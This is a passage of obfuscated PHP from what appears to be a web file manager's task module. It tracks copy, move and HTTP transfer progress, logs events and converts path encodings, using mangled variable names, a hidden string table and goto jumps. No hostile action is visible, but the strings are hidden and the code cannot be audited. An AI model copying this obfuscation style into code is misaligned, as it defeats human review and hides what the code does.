$œÕ€è¼ù[$ÄµÎª¬ö[487]] . $ÄµÎª¬ö[2002] . $Ÿı­úÛã); return !0; } public static function valueGet($“Á—ó¯Ã = false) { $‹­ş³€© =& $_SERVER[µÅ˜º…æ]; if ($“Á—ó¯Ã) { $ù¸‚œØş = Model($‹­ş³€©[534])->where(array($‹­ş³€©[95] => $“Á—ó¯Ã, $‹­ş³€©[33] => $‹­ş³€©[1242]))->find(); return $ù¸‚œØş ? json_decode($ù¸‚œØş[$‹­ş³€©[451]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($³ıïØÄ = false) { $êõ‘Š¤§ =& $_SERVER[µÅ˜º…æ]; $£ÅŸš³Ğ = array($êõ‘Š¤§[33] => $êõ‘Š¤§[1242]); if ($³ıïØÄ) { $£ÅŸš³Ğ[$êõ‘Š¤§[1593]] = $³ıïØÄ; } $Ö’˜ÌÛ™ = Model($êõ‘Š¤§[534])->where($£ÅŸš³Ğ)->select(); $Ö’˜ÌÛ™ = $Ö’˜ÌÛ™ ? $Ö’˜ÌÛ™ : array(); foreach ($Ö’˜ÌÛ™ as $»¦—ÈÇ¢ => $ò’„ÉÛÂ) { $Ö’˜ÌÛ™[$»¦—ÈÇ¢] = json_decode($ò’„ÉÛÂ[$êõ‘Š¤§[451]], !0); } return $Ö’˜ÌÛ™; } public static function valueSet($êƒçôÖÉ, $ÍÅöŞ£è) { $Ø¤ÛØŠó =& $_SERVER[µÅ˜º…æ]; if (!$ÍÅöŞ£è) { return Model($Ø¤ÛØŠó[534])->where(array($Ø¤ÛØŠó[95] => $êƒçôÖÉ, $Ø¤ÛØŠó[33] => $Ø¤ÛØŠó[1242]))->delete(); } $÷³½Ôı = json_encode($ÍÅöŞ£è); if (!$÷³½Ôı) { ob_start(); var_dump($ÍÅöŞ£è); $¦¢ô¡¶ = ob_get_clean(); self::log($Ø¤ÛØŠó[2003] . json_encode_force($¦¢ô¡¶)); } if (!$êƒçôÖÉ || !$ÍÅöŞ£è[$Ø¤ÛØŠó[487]]) { return !1; } $åäü¸‹Û = array($Ø¤ÛØŠó[33] => $Ø¤ÛØŠó[1242], $Ø¤ÛØŠó[1593] => USER_ID, $Ø¤ÛØŠó[95] => $êƒçôÖÉ, $Ø¤ÛØŠó[451] => $÷³½Ôı); $ª‡æ¸ï¤ = $Ø¤ÛØŠó[2004]; CacheLock::lock($ª‡æ¸ï¤); Model($Ø¤ÛØŠó[534])->add($åäü¸‹Û, array(), !0); CacheLock::unlock($ª‡æ¸ï¤); } public static function log($·˜çÚ¯«) { if (!GLOBAL_DEBUG) { return; } write_log($·˜çÚ¯«, $_SERVER[µÅ˜º…æ][2005]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Ï§øÙÊ± =& $_SERVER[µÅ˜º…æ]; $š¢®‚ËÎ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ï§øÙÊ±[2006], array($this, $Ï§øÙÊ±[2007])); Hook::bind($Ï§øÙÊ±[1414], array($this, $Ï§øÙÊ±[2008])); Hook::bind($Ï§øÙÊ±[2009], array($this, $Ï§øÙÊ±[2010])); Hook::bind($Ï§øÙÊ±[690], array($this, $Ï§øÙÊ±[2011])); Hook::bind($Ï§øÙÊ±[691], array($this, $Ï§øÙÊ±[2012])); Hook::bind($Ï§øÙÊ±[697], array($this, $Ï§øÙÊ±[2013])); Hook::bind($Ï§øÙÊ±[698], array($this, $Ï§øÙÊ±[2014])); Hook::bind($Ï§øÙÊ±[693], array($this, $Ï§øÙÊ±[2015])); Hook::bind($Ï§øÙÊ±[695], array($this, $Ï§øÙÊ±[2016])); Hook::bind($Ï§øÙÊ±[659], array($this, $Ï§øÙÊ±[2017])); Hook::bind($Ï§øÙÊ±[656], array($this, $Ï§øÙÊ±[2017])); Hook::bind($Ï§øÙÊ±[661], array($this, $Ï§øÙÊ±[2017])); Hook::bind($Ï§øÙÊ±[663], array($this, $Ï§øÙÊ±[2017])); Hook::bind($Ï§øÙÊ±[665], array($this, $Ï§øÙÊ±[2017])); Hook::bind($Ï§øÙÊ±[2018], array($this, $Ï§øÙÊ±[2019])); Hook::bind($Ï§øÙÊ±[681], array($this, $Ï§øÙÊ±[2020])); $this->sourceModelCopyFlag = !1; Hook::bind($Ï§øÙÊ±[2021], array($this, $Ï§øÙÊ±[2022])); Hook::bind($Ï§øÙÊ±[2023], array($this, $Ï§øÙÊ±[2024])); Hook::bind($Ï§øÙÊ±[2025], array($this, $Ï§øÙÊ±[2026])); $š¢®‚ËÎ[$Ï§øÙÊ±[2027]] = LNG($Ï§øÙÊ±[2028]); $š¢®‚ËÎ[$Ï§øÙÊ±[2029]] = 0; $š¢®‚ËÎ[$Ï§øÙÊ±[2030]] = 0; $š¢®‚ËÎ[$Ï§øÙÊ±[1235]] = $Ï§øÙÊ±[12]; $š¢®‚ËÎ[$Ï§øÙÊ±[2031]] = $Ï§øÙÊ±[12]; $š¢®‚ËÎ[$Ï§øÙÊ±[2032]] = 0; $š¢®‚ËÎ[$Ï§øÙÊ±[2033]] = 0; $š¢®‚ËÎ[$Ï§øÙÊ±[940]] = 0; if (!$š¢®‚ËÎ[$Ï§øÙÊ±[1865]]) { $š¢®‚ËÎ[$Ï§øÙÊ±[1865]] = LNG($Ï§øÙÊ±[2034]); } } protected function endAfter() { $¿•Ÿ è” =& $_SERVER[µÅ˜º…æ]; Hook::unbind($¿•Ÿ è”[2006], array($this, $¿•Ÿ è”[2007])); Hook::unbind($¿•Ÿ è”[1414], array($this, $¿•Ÿ è”[2008])); Hook::unbind($¿•Ÿ è”[2009], array($this, $¿•Ÿ è”[2010])); Hook::unbind($¿•Ÿ è”[690], array($this, $¿•Ÿ è”[2011])); Hook::unbind($¿•Ÿ è”[691], array($this, $¿•Ÿ è”[2012])); Hook::unbind($¿•Ÿ è”[697], array($this, $¿•Ÿ è”[2013])); Hook::unbind($¿•Ÿ è”[698], array($this, $¿•Ÿ è”[2014])); Hook::unbind($¿•Ÿ è”[693], array($this, $¿•Ÿ è”[2015])); Hook::unbind($¿•Ÿ è”[695], array($this, $¿•Ÿ è”[2016])); Hook::unbind($¿•Ÿ è”[659], array($this, $¿•Ÿ è”[2017])); Hook::unbind($¿•Ÿ è”[656], array($this, $¿•Ÿ è”[2017])); Hook::unbind($¿•Ÿ è”[661], array($this, $¿•Ÿ è”[2017])); Hook::unbind($¿•Ÿ è”[663], array($this, $¿•Ÿ è”[2017])); Hook::unbind($¿•Ÿ è”[665], array($this, $¿•Ÿ è”[2017])); Hook::unbind($¿•Ÿ è”[2018], array($this, $¿•Ÿ è”[2019])); Hook::unbind($¿•Ÿ è”[681], array($this, $¿•Ÿ è”[2020])); Hook::unbind($¿•Ÿ è”[2021], array($this, $¿•Ÿ è”[2022])); Hook::unbind($¿•Ÿ è”[2023], array($this, $¿•Ÿ è”[2024])); Hook::unbind($¿•Ÿ è”[2025], array($this, $¿•Ÿ è”[2026])); } public function copyMoveStart($‰ƒÅ˜Ìû, $àÛğışİ, $Øü«÷À¼, $¿’ò õñ) { $«Æ”à¼ =& $_SERVER[µÅ˜º…æ]; self::log($«Æ”à¼[2035] . $àÛğışİ . $«Æ”à¼[73] . $¿’ò õñ); $ßĞ¬¬©µ = rtrim(TEMP_FILES, $«Æ”à¼[8]); if (substr($àÛğışİ, 0, strlen($ßĞ¬¬©µ)) == $ßĞ¬¬©µ) { return; } if (substr($¿’ò õñ, 0, strlen($ßĞ¬¬©µ)) == $ßĞ¬¬©µ) { return; } $à¼Ä˜° =& $this->task; $à¼Ä˜°[$«Æ”à¼[2036]] = KodIO::transferType($‰ƒÅ˜Ìû, $Øü«÷À¼); self::log($«Æ”à¼[2037] . $à¼Ä˜°[$«Æ”à¼[2036]] . $«Æ”à¼[74] . $àÛğışİ . $«Æ”à¼[73] . $¿’ò õñ); $this->update(); } public function updateAfter() { $ª•íé¸ô =& $_SERVER[µÅ˜º…æ]; $¤¶§Æˆ =& $this->task; if (!$¤¶§Æˆ[$ª•íé¸ô[863]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¤¶§Æˆ[$ª•íé¸ô[2036]] == $ª•íé¸ô[1515]) { return; } self::updateTask($¤¶§Æˆ); } private static function updateTask(&$ĞÃÙÜÄ‘) { $¨«Ë¸–ì =& $_SERVER[µÅ˜º…æ]; if ($ĞÃÙÜÄ‘[$¨«Ë¸–ì[2036]] == $¨«Ë¸–ì[1386] || $ĞÃÙÜÄ‘[$¨«Ë¸–ì[2036]] == $¨«Ë¸–ì[107]) { if ($ĞÃÙÜÄ‘[$¨«Ë¸–ì[2031]]) { $ĞÃÙÜÄ‘[$¨«Ë¸–ì[940]] = $ĞÃÙÜÄ‘[$¨«Ë¸–ì[2033]] + $ĞÃÙÜÄ‘[$¨«Ë¸–ì[2030]]; } } else { if ($ĞÃÙÜÄ‘[$¨«Ë¸–ì[2036]] == $¨«Ë¸–ì[1516]) { if ($ĞÃÙÜÄ‘[$¨«Ë¸–ì[2031]] == $¨«Ë¸–ì[1386]) { $ĞÃÙÜÄ‘[$¨«Ë¸–ì[940]] = $ĞÃÙÜÄ‘[$¨«Ë¸–ì[2033]] + $ĞÃÙÜÄ‘[$¨«Ë¸–ì[2030]] * 0.5; } else { if ($ĞÃÙÜÄ‘[$¨«Ë¸–ì[2031]] == $¨«Ë¸–ì[107]) { $ĞÃÙÜÄ‘[$¨«Ë¸–ì[940]] = $ĞÃÙÜÄ‘[$¨«Ë¸–ì[2033]] + $ĞÃÙÜÄ‘[$¨«Ë¸–ì[2029]] * 0.5 + $ĞÃÙÜÄ‘[$¨«Ë¸–ì[2030]] * 0.5; } } } } $ĞÃÙÜÄ‘[$¨«Ë¸–ì[1977]] = $ĞÃÙÜÄ‘[$¨«Ë¸–ì[940]] / $ĞÃÙÜÄ‘[$¨«Ë¸–ì[863]]; if ($ĞÃÙÜÄ‘[$¨«Ë¸–ì[1977]] > 0) { $ü„ûİ”¦ = timeFloat() - $ĞÃÙÜÄ‘[$¨«Ë¸–ì[1979]] - $ĞÃÙÜÄ‘[$¨«Ë¸–ì[1982]]; $ĞÃÙÜÄ‘[$¨«Ë¸–ì[1983]] = $ü„ûİ”¦ * (1 - $ĞÃÙÜÄ‘[$¨«Ë¸–ì[1977]]) / $ĞÃÙÜÄ‘[$¨«Ë¸–ì[1977]]; } $¿ôÍê™ = $ĞÃÙÜÄ‘[$¨«Ë¸–ì[2030]] . $¨«Ë¸–ì[991] . $ĞÃÙÜÄ‘[$¨«Ë¸–ì[2029]] . "\73\x20{$¸áşÇší}\73" . $ĞÃÙÜÄ‘[$¨«Ë¸–ì[940]]; self::log($¨«Ë¸–ì[2038] . $ĞÃÙÜÄ‘[$¨«Ë¸–ì[2031]] . $¨«Ë¸–ì[74] . $ĞÃÙÜÄ‘[$¨«Ë¸–ì[1977]] . $¨«Ë¸–ì[74] . $¿ôÍê™); } public function addPath($±‚ø¼ı¸) { $çòä¢ßÅ =& $_SERVER[µÅ˜º…æ]; if (!$±‚ø¼ı¸) { return; } $À‰Ü»çÕ =& $this->task; $®ü»Í×Å = IO::infoWithChildren($±‚ø¼ı¸); $¹ØÍáğì = $À‰Ü»çÕ[$çòä¢ßÅ[2039]] ? $À‰Ü»çÕ[$çòä¢ßÅ[2039]][$çòä¢ßÅ[2040]] : 0; $À‰Ü»çÕ[$çòä¢ßÅ[2039]] = array($çòä¢ßÅ[2040] => $¹ØÍáğì + 1, $çòä¢ßÅ[509] => $®ü»Í×Å[$çòä¢ßÅ[32]], $çòä¢ßÅ[87] => $®ü»Í×Å[$çòä¢ßÅ[87]], $çòä¢ßÅ[602] => $®ü»Í×Å[$çòä¢ßÅ[602]] ? $®ü»Í×Å[$çòä¢ßÅ[602]] : $®ü»Í×Å[$çòä¢ßÅ[87]]); if ($®ü»Í×Å[$çòä¢ßÅ[33]] == $çòä¢ßÅ[230]) { $À‰Ü»çÕ[$çòä¢ßÅ[1233]] += 1; } else { $À‰Ü»çÕ[$çòä¢ßÅ[1233]] += $®ü»Í×Å[$çòä¢ßÅ[82]][$çòä¢ßÅ[80]]; if ($®ü»Í×Å[$çòä¢ßÅ[191]]) { $À‰Ü»çÕ[$çòä¢ßÅ[1233]] += $®ü»Í×Å[$çòä¢ßÅ[82]][$çòä¢ßÅ[81]] + 1; } } $À‰Ü»çÕ[$çòä¢ßÅ[863]] += $®ü»Í×Å[$çòä¢ßÅ[79]]; $this->update(); self::log(array($çòä¢ßÅ[2041] . $±‚ø¼ı¸, $®ü»Í×Å)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Õüä‡£‰) { } public function sourceAddHashEnd($ò¯öÚÜò) { } public function sourceAddFileStart($ñ®ÁáÌ¸) { $âÍİ×–Œ =& $_SERVER[µÅ˜º…æ]; $®®íŒ€¶ =& $this->task; $®®íŒ€¶[$âÍİ×–Œ[2029]] = $ñ®ÁáÌ¸[$âÍİ×–Œ[79]]; $®®íŒ€¶[$âÍİ×–Œ[2027]] = $ñ®ÁáÌ¸[$âÍİ×–Œ[32]]; $®®íŒ€¶[$âÍİ×–Œ[1235]] = $ñ®ÁáÌ¸[$âÍİ×–Œ[32]]; $®®íŒ€¶[$âÍİ×–Œ[2042]] = $ñ®ÁáÌ¸[$âÍİ×–Œ[87]]; $this->update(); self::log($âÍİ×–Œ[2043] . $ñ®ÁáÌ¸[$âÍİ×–Œ[87]] . $âÍİ×–Œ[2044] . $ñ®ÁáÌ¸[$âÍİ×–Œ[79]]); } public function sourceAddFileEnd($«…êì‰‹) { $î”ÀŠÉå =& $_SERVER[µÅ˜º…æ]; $õÍêÆÀø =& $this->task; $õÍêÆÀø[$î”ÀŠÉå[940]] += $«…êì‰‹[$î”ÀŠÉå[79]]; $õÍêÆÀø[$î”ÀŠÉå[2042]] = $«…êì‰‹[$î”ÀŠÉå[87]]; $this->update(1); self::log($î”ÀŠÉå[2045] . $«…êì‰‹[$î”ÀŠÉå[87]] . $î”ÀŠÉå[2044] . $«…êì‰‹[$î”ÀŠÉå[79]] . $î”ÀŠÉå[2046]); } public function copyFileStart($‚Ó™ÛÑè, $…è¼–ŞÕ, $»¾›œƒô, $‰ªò£¥‰, $²”ƒ©©¾, $Åƒ•ìâ”) { $îÈºÉ©ª =& $_SERVER[µÅ˜º…æ]; $Ó‚ş¸ñ¹ = $²”ƒ©©¾; if ($Ó‚ş¸ñ¹ == $GLOBALS[$îÈºÉ©ª[2047]]) { $Ó‚ş¸ñ¹ = $GLOBALS[$îÈºÉ©ª[2048]]; } $GLOBALS[$îÈºÉ©ª[2048]] = $²”ƒ©©¾; $GLOBALS[$îÈºÉ©ª[2047]] = $Åƒ•ìâ”; $Ù­¹¨Íı =& $this->task; $Ù­¹¨Íı[$îÈºÉ©ª[2027]] = $Ó‚ş¸ñ¹; $Ù­¹¨Íı[$îÈºÉ©ª[2029]] = (int) $‚Ó™ÛÑè->size($…è¼–ŞÕ); $Ù­¹¨Íı[$îÈºÉ©ª[2030]] = 0; $Ù­¹¨Íı[$îÈºÉ©ª[1235]] = $îÈºÉ©ª[12]; $Ù­¹¨Íı[$îÈºÉ©ª[2031]] = $îÈºÉ©ª[12]; $Ù­¹¨Íı[$îÈºÉ©ª[2032]] = 0; $Šƒıòƒ = $Ù­¹¨Íı[$îÈºÉ©ª[2029]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Ù­¹¨Íı[$îÈºÉ©ª[487]] . $îÈºÉ©ª[2049]); if ($Šƒıòƒ && file_exists(get_path_father($‰ªò£¥‰))) { Cache::set($Ù­¹¨Íı[$îÈºÉ©ª[487]] . $îÈºÉ©ª[2049], $‰ªò£¥‰); $Ù­¹¨Íı[$îÈºÉ©ª[2000]] = array($îÈºÉ©ª[2050], $îÈºÉ©ª[2051]); } $this->update(0, $Šƒıòƒ); self::log("\x63\157\160\x79\106\151\154\145\123\164\141\x72\164\x3a{$…è¼–ŞÕ}\x3b"); } public static function updateCopyLocalFileSize($ğ†××Ì¯) { $‡Àßø¨ê =& $_SERVER[µÅ˜º…æ]; $®íá›ÌÒ = Cache::get($ğ†××Ì¯[$‡Àßø¨ê[487]] . $‡Àßø¨ê[2049]); if (!$®íá›ÌÒ || !file_exists($®íá›ÌÒ)) { return $ğ†××Ì¯; } $ğ†××Ì¯[$‡Àßø¨ê[2030]] = @filesize($®íá›ÌÒ); $ğ†××Ì¯[$‡Àßø¨ê[940]] += $ğ†××Ì¯[$‡Àßø¨ê[2030]]; self::updateTask($ğ†××Ì¯); return $ğ†××Ì¯; } public function copyFileEnd($å«¶¿Ù», $Ìıªëê±, $áŠ·Î˜Ö, $Ú‹íšÜ“, $°›±Ÿ ¤, $ş€üü°¦) { $¯ŸŞş¾» =& $_SERVER[µÅ˜º…æ]; $ÍÑÑª†Ô =& $this->task; $ÍÑÑª†Ô[$¯ŸŞş¾»[2030]] = $ÍÑÑª†Ô[$¯ŸŞş¾»[2029]]; $ÍÑÑª†Ô[$¯ŸŞş¾»[2031]] = $¯ŸŞş¾»[12]; unset($ÍÑÑª†Ô[$¯ŸŞş¾»[2000]]); if ($°›±Ÿ ¤ == $ÍÑÑª†Ô[$¯ŸŞş¾»[2027]]) { $ÍÑÑª†Ô[$¯ŸŞş¾»[2033]] += $ÍÑÑª†Ô[$¯ŸŞş¾»[2029]]; $ÍÑÑª†Ô[$¯ŸŞş¾»[940]] = $ÍÑÑª†Ô[$¯ŸŞş¾»[2033]]; $ÛêÍşòã = 1; if (isset($ÍÑÑª†Ô[$¯ŸŞş¾»[2042]]) && $ÍÑÑª†Ô[$¯ŸŞş¾»[2042]] == $Ìıªëê±) { $ÛêÍşòã = 0; } $this->update($ÛêÍşòã); } else { $this->update(); $ÍÑÑª†Ô[$¯ŸŞş¾»[2030]] = 0; } Cache::remove($ÍÑÑª†Ô[$¯ŸŞş¾»[487]] . $¯ŸŞş¾»[2049]); self::log($¯ŸŞş¾»[2052] . $Ìıªëê± . $¯ŸŞş¾»[73] . $Ú‹íšÜ“ . $¯ŸŞş¾»[285] . $°›±Ÿ ¤ . $¯ŸŞş¾»[2053] . $ÍÑÑª†Ô[$¯ŸŞş¾»[2027]]); } public function updateFileEnd($€ÃßºÇà, $ì›´Ç§) { $ìÏí§Ö” =& $_SERVER[µÅ˜º…æ]; $”••üÔ£ =& $this->task; $”••üÔ£[$ìÏí§Ö”[2027]] = $€ÃßºÇà; $”••üÔ£[$ìÏí§Ö”[2029]] = $ì›´Ç§; $”••üÔ£[$ìÏí§Ö”[2033]] += $ì›´Ç§; $”••üÔ£[$ìÏí§Ö”[940]] = $”••üÔ£[$ìÏí§Ö”[2033]]; $this->update(1); self::log($ìÏí§Ö”[2054] . $€ÃßºÇà); } public function sourceModelCopy($ÁõË’õÂ) { $ŒšœŒ›Ş =& $_SERVER[µÅ˜º…æ]; $Œ·¥Ûõõ = $ÁõË’õÂ[0]; $Â©¾¬Øş = $ÁõË’õÂ[1]; $ÃºëÕîÑ =& $this->task; $this->sourceModelCopyFlag = !0; $©ˆ†…«õ = 0; switch ($Œ·¥Ûõõ) { case $ŒšœŒ›Ş[657]: $©ˆ†…«õ = 1; break; case $ŒšœŒ›Ş[660]: $ÃºëÕîÑ[$ŒšœŒ›Ş[2027]] = $Â©¾¬Øş[$ŒšœŒ›Ş[32]]; break; case $ŒšœŒ›Ş[662]: $©ˆ†…«õ = intval($ÁõË’õÂ[$ŒšœŒ›Ş[467]] * 0.4); break; case $ŒšœŒ›Ş[664]: $©ˆ†…«õ = intval($ÁõË’õÂ[$ŒšœŒ›Ş[467]] * 0.2); break; case $ŒšœŒ›Ş[666]: $©ˆ†…«õ = intval($ÁõË’õÂ[$ŒšœŒ›Ş[467]] * 0.4); break; } $this->update($©ˆ†…«õ); self::log(array("{$Œ·¥Ûõõ}\73\141\144\x64\75{$©ˆ†…«õ}", $ÁõË’õÂ)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ûà£¬Åİ, $ó¥å³Õ) { $§ë‹‚… =& $_SERVER[µÅ˜º…æ]; $this->sourceModelCopyFlag = !0; $áÒéÔ¢ = 1; if (isset($ûà£¬Åİ[$§ë‹‚…[82]])) { $áÒéÔ¢ = $ûà£¬Åİ[$§ë‹‚…[82]][$§ë‹‚…[80]]; $áÒéÔ¢ = $áÒéÔ¢ + $ûà£¬Åİ[$§ë‹‚…[82]][$§ë‹‚…[81]] + 1; } $this->update($áÒéÔ¢); $this->sourceModelCopyFlag = !1; $this->log(array($§ë‹‚…[2055], $áÒéÔ¢, $ûà£¬Åİ)); } public function sourceMove($Ú¦ˆÃŸ) { $this->sourceRemove($Ú¦ˆÃŸ, !1); } public function curlProgress($ÇŠŠˆÙ•, $˜Ñöò¸¡, $­üŠíÚ, $¢ŠûÊÅè, $™¡Å‡¾é) { $­¦Û„™ =& $_SERVER[µÅ˜º…æ]; $¨ÏÂÂ¹ =& $this->task; if ($™¡Å‡¾é > 0) { $¨ÏÂÂ¹[$­¦Û„™[1235]] = $­¦Û„™[2056]; $¨ÏÂÂ¹[$­¦Û„™[2031]] = $­¦Û„™[107]; if ($¨ÏÂÂ¹[$­¦Û„™[2029]]) { $¨ÏÂÂ¹[$­¦Û„™[2030]] = $™¡Å‡¾é; } if ($¨ÏÂÂ¹[$­¦Û„™[2032]]) { $¨ÏÂÂ¹[$­¦Û„™[2030]] = $™¡Å‡¾é + $¨ÏÂÂ¹[$­¦Û„™[2032]]; } } else { if ($­üŠíÚ > 0) { if ($¨ÏÂÂ¹[$­¦Û„™[2029]] == $˜Ñöò¸¡) { $¨ÏÂÂ¹[$­¦Û„™[2030]] = $­üŠíÚ; $¨ÏÂÂ¹[$­¦Û„™[1235]] = $­¦Û„™[2057]; $¨ÏÂÂ¹[$­¦Û„™[2031]] = $­¦Û„™[1386]; } } } $this->update(); $·ñ­„‡ = "\144\157\167\156\x3a{$­üŠíÚ}\x2f{$˜Ñöò¸¡}\73\40\165\x70\154\x6f\141\x64\x3a{$™¡Å‡¾é}\x2f{$¢ŠûÊÅè}\73\x66\x69\x6c\145\x3d" . $¨ÏÂÂ¹[$­¦Û„™[2029]]; self::log(array($­¦Û„™[2058] . $·ñ­„‡ . $­¦Û„™[74] . $¨ÏÂÂ¹[$­¦Û„™[2027]], curl_getinfo($ÇŠŠˆÙ•))); } public function curlProgressStart($€ßÑ´«) { } public function curlProgressEnd($Ü²ì‰Æõ) { $ÕÚåïÚÇ =& $_SERVER[µÅ˜º…æ]; $¢ˆŸ­’ñ =& $this->task; $®÷¯Ş¨˜ = curl_getinfo($Ü²ì‰Æõ); $Ñî°Û‘ = $®÷¯Ş¨˜[$ÕÚåïÚÇ[2059]]; if ($Ñî°Û‘ == -1) { $Ñî°Û‘ = $®÷¯Ş¨˜[$ÕÚåïÚÇ[2060]]; } if ($¢ˆŸ­’ñ[$ÕÚåïÚÇ[2031]] == $ÕÚåïÚÇ[107] && $Ñî°Û‘) { $¢ˆŸ­’ñ[$ÕÚåïÚÇ[2032]] += $Ñî°Û‘; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ÒÆ×› =& $_SERVER[µÅ˜º…æ]; $€¬µâ‘˜ =& $this->task; $€¬µâ‘˜[$ÒÆ×›[2061]] = 1; Hook::bind($ÒÆ×›[2021], array($this, $ÒÆ×›[2062])); Hook::bind($ÒÆ×›[2023], array($this, $ÒÆ×›[2063])); Hook::bind($ÒÆ×›[2025], array($this, $ÒÆ×›[2064])); } protected function endAfter() { $¢àã—¢¨ =& $_SERVER[µÅ˜º…æ]; Hook::unbind($¢àã—¢¨[2021], array($this, $¢àã—¢¨[2062])); Hook::unbind($¢àã—¢¨[2023], array($this, $¢àã—¢¨[2063])); Hook::unbind($¢àã—¢¨[2025], array($this, $¢àã—¢¨[2064])); } public function progressStart($¸’üš”Ğ) { $¼ÄıåËŸ =& $_SERVER[µÅ˜º…æ]; $üÜõëµæ = curl_getinfo($¸’üš”Ğ); self::log($¼ÄıåËŸ[2065] . $üÜõëµæ[$¼ÄıåËŸ[382]]); self::valueSet($this->task[$¼ÄıåËŸ[487]], $this->task); } public function progressEnd($¹êûÎ) { $ƒ¯õÎ‹ =& $_SERVER[µÅ˜º…æ]; self::log($ƒ¯õÎ‹[2066] . $this->task[$ƒ¯õÎ‹[487]]); $this->end(); } public function progress($øæÊ–×Ö, $öÁôœöÆ, $ù¯Ò’¡ã, $õêô§±, $øäáŒØã) { $ÑÜ·œ¦Ñ =& $_SERVER[µÅ˜º…æ]; $Ç¨¾šÑ‰ =& $this->task; if ($øäáŒØã > 0) { $Ç¨¾šÑ‰[$ÑÜ·œ¦Ñ[1233]] = $Ç¨¾šÑ‰[$ÑÜ·œ¦Ñ[1233]] == 0 ? $õêô§± : $Ç¨¾šÑ‰[$ÑÜ·œ¦Ñ[1233]]; $Ç¨¾šÑ‰[$ÑÜ·œ¦Ñ[1976]] = $øäáŒØã; } else { if ($ù¯Ò’¡ã > 0) { $Ç¨¾šÑ‰[$ÑÜ·œ¦Ñ[1233]] = $Ç¨¾šÑ‰[$ÑÜ·œ¦Ñ[1233]] == 0 ? $öÁôœöÆ : $Ç¨¾šÑ‰[$ÑÜ·œ¦Ñ[1233]]; $Ç¨¾šÑ‰[$ÑÜ·œ¦Ñ[1976]] = $ù¯Ò’¡ã; } } $this->update(); self::log("\160\162\x6f\147\x72\145\x73\163\x48\x74\164\160\x3a\144\157\x77\156\x3a{$ù¯Ò’¡ã}\57{$öÁôœöÆ}\73\x20\x75\160\154\157\141\144\72{$øäáŒØã}\x2f{$õêô§±}\73"); } } goto f’¼µ™õ™´; eŒ²Ë¿¢‹: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ùèèÎ½ =& $_SERVER[µÅ˜º…æ]; $this->objectDriver = array($ùèèÎ½[60], $ùèèÎ½[61], $ùèèÎ½[62], $ùèèÎ½[63], $ùèèÎ½[64], $ùèèÎ½[65], $ùèèÎ½[66], $ùèèÎ½[67], $ùèèÎ½[68], $ùèèÎ½[69], $ùèèÎ½[70], $ùèèÎ½[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($…•¨Ó¼È) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($…•¨Ó¼È, $_SERVER[µÅ˜º…æ][8]); } return $…•¨Ó¼È; } public function iconvApp($­ğÅúÆƒ) { return $­ğÅúÆƒ; } public function iconvSystem($Ò¯¥››) { return $Ò¯¥››; } public function iconvTo($šªŒßü×, $êÙÔÆİÖ, $àõØ¿äÌ) { $ÔÀ­€ÕÊ =& $_SERVER[µÅ˜º…æ]; if (!$šªŒßü× || !function_exists($ÔÀ­€ÕÊ[72])) { return $šªŒßü×; } static $«ü®àò‚ = array(); $–©æ‚©ğ = $êÙÔÆİÖ . $ÔÀ­€ÕÊ[73] . $àõØ¿äÌ . $ÔÀ­€ÕÊ[74] . $šªŒßü×; if (isset($«ü®àò‚[$–©æ‚©ğ])) { return $«ü®àò‚[$–©æ‚©ğ]; } if (function_exists($ÔÀ­€ÕÊ[75])) { $ŠÜŸØ³« = @mb_convert_encoding($šªŒßü×, $àõØ¿äÌ, $êÙÔÆİÖ); } else { $ŠÜŸØ³« = @iconv($êÙÔÆİÖ, $àõØ¿äÌ, $šªŒßü×); } $ŠÜŸØ³« = $ŠÜŸØ³« ? $ŠÜŸØ³« : $šªŒßü×; if (strstr($ŠÜŸØ³«, $ÔÀ­€ÕÊ[76])) { $ŠÜŸØ³« = str_replace($ÔÀ­€ÕÊ[76], $ÔÀ­€ÕÊ[11], $ŠÜŸØ³«); } $«ü®àò‚[$êÙÔÆİÖ . $ÔÀ­€ÕÊ[73] . $àõØ¿äÌ . $ÔÀ­€ÕÊ[74] . $šªŒßü×] = $ŠÜŸØ³«; $«ü®àò‚[$àõØ¿äÌ . $ÔÀ­€ÕÊ[73] . $êÙÔÆİÖ . $ÔÀ­€ÕÊ[74] . $šªŒßü×] = $šªŒßü×; $«ü®àò‚[$àõØ¿äÌ . $ÔÀ­€ÕÊ[73] . $êÙÔÆİÖ . $ÔÀ­€ÕÊ[74] . $ŠÜŸØ³«] = $šªŒßü×; $«ü®àò‚[$êÙÔÆİÖ . $ÔÀ­€ÕÊ[73] . $àõØ¿äÌ . $ÔÀ­€ÕÊ[74] . $ŠÜŸØ³«] = $ŠÜŸØ³«; return $ŠÜŸØ³«; } public function getPathInner($“²¯–÷Á) { $ˆŒ¨òó = IO::init($“²¯–÷Á); return $ˆŒ¨òó->path; } public function getPathOuter($”‚’È°) { $§§«¾æ =& $_SERVER[µÅ˜º…æ]; $°® = strlen(trim($this->pathBase, $§§«¾æ[8])); $”‚’È° = substr(trim($”‚’È°, $§§«¾æ[8]), $°®); return $this->pathDriver . $§§«¾æ[8] . ltrim($”‚’È°, $§§«¾æ[8]); } public function isParentOf($«Çˆ÷³Í, $§¶ãæ«‡) { $ğœ¥ ŸÎ =& $_SERVER[µÅ˜º…æ]; $«Çˆ÷³Í = rtrim(strtolower($«Çˆ÷³Í), $ğœ¥ ŸÎ[8]) . $ğœ¥ ŸÎ[8]; $§¶ãæ«‡ = rtrim(strtolower($§¶ãæ«‡), $ğœ¥ ŸÎ[8]) . $ğœ¥ ŸÎ[8]; $°“Ğı²” = strpos($§¶ãæ«‡, $«Çˆ÷³Í) === 0; return $°“Ğı²”; } public function getType() { $ßÏ¼ûÆ¥ =& $_SERVER[µÅ˜º…æ]; $®Ó¥˜æ = str_replace($ßÏ¼ûÆ¥[77], $ßÏ¼ûÆ¥[12], get_class($this)); return strtolower($®Ó¥˜æ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), 